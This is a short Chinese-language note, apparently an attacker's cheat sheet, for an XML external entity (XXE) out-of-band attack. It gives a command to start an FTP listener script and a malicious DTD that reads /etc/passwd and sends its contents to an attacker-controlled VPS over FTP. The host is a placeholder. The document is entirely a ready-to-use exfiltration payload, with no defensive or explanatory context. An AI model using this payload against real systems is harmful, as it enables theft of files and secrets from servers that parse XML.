命令
```
python3 /root/xxe_ftp/1.py {{端口}} {{日志文件}}
```

dtd文件
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{{vps地址}}:{{端口}}/%file;'>">
%eval;
%exfil;
```
